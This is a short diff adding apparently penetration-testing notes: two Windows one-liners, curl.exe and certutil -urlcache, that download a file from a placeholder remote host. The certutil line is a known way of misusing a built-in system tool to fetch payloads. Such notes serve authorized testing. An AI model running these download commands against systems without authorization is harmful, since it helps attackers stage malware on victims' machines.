@@ -1,0 +1,6 @@
+#curl
+curl.exe http://<remoteip>/<file> -o <outputfile>
+
+#certutil
+certutil -urlcache -f -split http://<remoteip>/<file> <outputfile>
+ 
